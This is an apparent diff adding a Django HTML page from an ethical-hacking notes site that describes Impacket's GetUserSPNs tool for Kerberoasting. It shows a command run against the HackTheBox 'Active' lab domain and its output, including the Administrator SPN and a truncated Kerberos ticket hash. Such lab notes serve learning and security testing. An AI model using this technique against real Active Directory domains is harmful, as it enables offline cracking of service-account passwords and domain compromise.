@@ -1,0 +1,30 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>What is Impacket-GetUserSPNs?</h1>
+    <p class="common">Impacket-getuserspns is an Impacket tool that enumerates Active Directory accounts with Service Principal Names (SPNs), requests Kerberos service tickets (TGS) for them, and saves tickets for offline Kerberoasting password cracking. Requires valid credentials or a Kerberos ticket.</p>
+    <p class="common">※You need password</p>
+    <h1>Usage</h1>
+    <div class="code-box"><pre><code>impacket-GetUserSPNs active.htb/svc_tgs -dc-ip $IP -request
+
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-11-05 22:45:55.751336             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$35d82...8a243a9c40c51161a171c76cffa912bd</code></pre></div>
+</body>
+</html>
